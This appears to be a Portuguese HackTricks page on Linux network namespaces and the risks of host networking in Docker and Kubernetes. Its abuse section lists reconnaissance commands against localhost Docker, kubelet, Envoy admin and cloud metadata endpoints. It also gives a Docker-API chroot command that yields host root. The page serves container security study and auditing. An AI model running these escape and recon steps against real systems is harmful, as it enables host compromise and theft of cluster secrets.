# Namespace de Rede

{{#include ../../../../../banners/hacktricks-training.md}}

## Visão geral

O namespace de rede isola recursos relacionados à rede, como interfaces, endereços IP, tabelas de roteamento, estado ARP/vizinhos, regras de firewall, sockets, o namespace abstrato de sockets de domínio UNIX e o conteúdo de arquivos como `/proc/net`. É por isso que um contêiner pode ter o que parece ser seu próprio `eth0`, suas próprias rotas locais e seu próprio dispositivo de loopback sem possuir a real network stack do host.

Do ponto de vista de segurança, isso é importante porque o isolamento de rede envolve muito mais do que o binding de portas. Um namespace de rede privado limita o que o workload pode observar ou reconfigurar diretamente. Quando esse namespace é compartilhado com o host, o contêiner pode repentinamente obter visibilidade sobre listeners do host, serviços locais do host, endpoints AF_UNIX abstratos e pontos de controle de rede que nunca deveriam ser expostos à aplicação.

## Operação

Um namespace de rede recém-criado começa com um ambiente de rede vazio ou quase vazio até que interfaces sejam anexadas a ele. Em seguida, os container runtimes criam ou conectam interfaces virtuais, atribuem endereços e configuram rotas para que o workload tenha a conectividade esperada. Em deployments baseados em bridge, isso geralmente significa que o contêiner vê uma interface respaldada por veth conectada a uma bridge do host. No Kubernetes, os plugins CNI gerenciam a configuração equivalente para o networking do Pod.

Essa arquitetura explica por que `--network=host` ou `hostNetwork: true` representa uma mudança tão drástica. Em vez de receber uma network stack privada preparada, o workload ingressa na network stack real do host.

## Lab

Você pode ver um namespace de rede quase vazio com:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
E você pode comparar contêineres normais e contêineres com a rede do host:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
O container com host networking não tem mais sua própria visão isolada de sockets e interfaces. Essa alteração, por si só, já é significativa antes mesmo de você verificar quais capabilities o processo possui.

## Uso em Runtime

Docker e Podman normalmente criam um network namespace privado para cada container, a menos que configurados de outra forma. O Kubernetes geralmente fornece a cada Pod seu próprio network namespace, compartilhado pelos containers dentro desse Pod, mas separado do host. Isso significa que `127.0.0.1` normalmente é local ao Pod, e não ao container: um listener vinculado apenas ao localhost em um container normalmente pode ser acessado pelos sidecars e containers irmãos. Os sistemas Incus/LXC também fornecem um isolamento robusto baseado em network namespaces, frequentemente com uma variedade maior de configurações de redes virtuais.

O princípio comum é que a rede privada é o limite de isolamento padrão, enquanto o host networking é uma saída explícita desse limite.

## Configurações Incorretas

A configuração incorreta mais importante é simplesmente compartilhar o network namespace do host. Isso às vezes é feito por desempenho, monitoramento de baixo nível ou conveniência, mas remove um dos limites mais claros disponíveis para containers. Listeners locais ao host tornam-se acessíveis de forma mais direta, serviços acessíveis apenas pelo localhost podem se tornar acessíveis, e capabilities como `CAP_NET_ADMIN` ou `CAP_NET_RAW` tornam-se muito mais perigosas, pois as operações que elas permitem passam a ser aplicadas ao próprio ambiente de rede do host.

Outro problema é conceder capabilities relacionadas à rede em excesso, mesmo quando o network namespace é privado. Um namespace privado ajuda, mas não torna sockets raw ou controles avançados de rede inofensivos.

No Kubernetes, `hostNetwork: true` também altera o quanto você pode confiar na segmentação de rede no nível do Pod. A documentação do Kubernetes informa que muitos plugins de rede não conseguem distinguir corretamente o tráfego de Pods com `hostNetwork` para correspondências de `podSelector` / `namespaceSelector` e, por isso, tratam esse tráfego como tráfego comum do node. Do ponto de vista de um atacante, isso significa que uma workload comprometida com `hostNetwork` geralmente deve ser tratada como um ponto de apoio de rede no nível do node, e não como um Pod normal ainda limitado pelas mesmas premissas de policy aplicadas às workloads em overlay network.

## Abuso

Em ambientes com isolamento fraco, atacantes podem inspecionar serviços em listening no host, acessar endpoints de gerenciamento vinculados apenas ao loopback, capturar ou interferir no tráfego dependendo das capabilities e do ambiente específicos, ou reconfigurar o roteamento e o estado do firewall se `CAP_NET_ADMIN` estiver presente. Em um cluster, isso também pode facilitar o movimento lateral e o reconhecimento do control plane.

Se você suspeitar de host networking, comece confirmando que as interfaces e os listeners visíveis pertencem ao host, e não a uma rede de container isolada:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Serviços disponíveis apenas no loopback costumam ser a primeira descoberta interessante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Os sockets UNIX abstratos são outro alvo fácil de ignorar, pois têm escopo de namespace de rede, embora não se pareçam com listeners TCP/UDP e possam não existir como caminhos do sistema de arquivos em `/run`. Portanto, um container com a rede do host pode herdar acesso a canais de controle exclusivos do host que nunca foram montados no container via bind:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Um exemplo histórico foi o bug de exposição de abstract socket do `containerd-shim`, mas a lição mais ampla é mais importante que o CVE específico: quando um workload entra no network namespace do host, os serviços AF_UNIX abstratos também passam a fazer parte da attack surface. Se esses sockets parecerem relacionados ao runtime ou administrativos, avance para [Exposição da API do Runtime e do Daemon](../../runtime-api-and-daemon-exposure.md).

Se houver capabilities de rede presentes, teste se o workload consegue inspecionar ou alterar a stack visível:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Em kernels modernos, a rede do host em conjunto com `CAP_NET_ADMIN` também pode expor o caminho dos pacotes além de simples alterações em `iptables` / `nftables`. `qdiscs` e filtros de `tc` também têm escopo por namespace; portanto, em um namespace de rede do host compartilhado, eles se aplicam às interfaces do host que o container consegue visualizar. Se `CAP_BPF` também estiver presente, programas eBPF relacionados à rede, como loaders de TC e XDP, também se tornam relevantes:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Isso é importante porque um atacante pode conseguir espelhar, redirecionar, moldar ou descartar o tráfego no nível da interface do host, não apenas reescrever regras de firewall. Em um network namespace privado, essas ações ficam contidas na visão do container; em um namespace do host compartilhado, elas passam a afetar o host.

Em ambientes de cluster ou cloud, o host networking também justifica um recon local rápido de metadata e de serviços adjacentes ao control plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
No Kubernetes, lembre-se de que comprometer **qualquer** container em um Pod com vários containers também dá acesso aos listeners de localhost abertos pelos containers irmãos e sidecars, pois todo o Pod compartilha um único network namespace. Isso se torna especialmente relevante com service-mesh, observability e containers auxiliares cujas interfaces de administração ou debug são intencionalmente internas ao Pod, em vez de abranger todo o cluster:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Trate "bound to localhost" como **privado ao Pod**, não **privado ao container**. Depois que um container no Pod for comprometido, essa suposição deixa de ser válida.

### Exemplo completo: Host Networking + Acesso local ao Runtime / Kubelet

O host networking não fornece automaticamente root no host, mas frequentemente expõe serviços que foram intencionalmente configurados para serem acessíveis apenas pelo próprio node. Se um desses serviços tiver proteção fraca, o host networking se torna um caminho direto para privilege escalation.

Docker API em localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet no localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impacto:

- comprometimento direto do host se uma API de runtime local estiver exposta sem proteção adequada
- reconhecimento do cluster ou movimento lateral se o kubelet ou agentes locais estiverem acessíveis
- manipulação de tráfego ou negação de serviço quando combinado com `CAP_NET_ADMIN`

## Verificações

O objetivo dessas verificações é descobrir se o processo tem uma network stack privada, quais rotas e listeners estão visíveis e se a visão da rede já se parece com a do host antes mesmo de testar capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
O que é interessante aqui:

- Se `/proc/self/ns/net` e `/proc/1/ns/net` já parecerem semelhantes aos do host, o container pode estar compartilhando o network namespace do host ou outro namespace não privado.
- `lsns -t net` e `ip netns identify` são úteis quando o shell já está dentro de um namespace nomeado ou persistente e você quer correlacioná-lo com objetos de `/run/netns` do lado do host.
- `ss -lntup` é especialmente valioso porque revela listeners acessíveis apenas pelo loopback e endpoints locais de gerenciamento. `ss -xap` e `/proc/net/unix` adicionam a visão dos abstract sockets que buscas comuns por sockets no filesystem não identificam.
- Rotas, nomes de interfaces, contexto do firewall, estado do `tc` e attachments de eBPF tornam-se muito mais importantes se `CAP_NET_ADMIN`, `CAP_NET_RAW` ou `CAP_BPF` estiver presente.
- No Kubernetes, uma falha na resolução de nomes de serviços a partir de um Pod com `hostNetwork` pode simplesmente significar que o Pod não está usando `dnsPolicy: ClusterFirstWithHostNet`, e não que o serviço esteja ausente.
- Em Pods com múltiplos containers, listeners no localhost pertencem a todo o network namespace do Pod. Portanto, verifique os sidecars e os containers irmãos antes de presumir que uma porta acessível apenas pelo loopback não pode ser alcançada a partir do container comprometido.

Ao analisar um container, sempre avalie o network namespace junto com o conjunto de capabilities. Host networking combinado com capabilities de rede fortes representa uma postura muito diferente de bridge networking combinado com um conjunto restrito de capabilities padrão.

## Referências

- [Ressalvas sobre Kubernetes NetworkPolicy e `hostNetwork`](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [`network_namespaces(7)` do Linux e isolamento de abstract UNIX sockets](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [Advisory do containerd: abstract Unix domain sockets expostos a containers com host-network](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [Requisitos de token e capabilities do eBPF para programas eBPF relacionados à rede](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
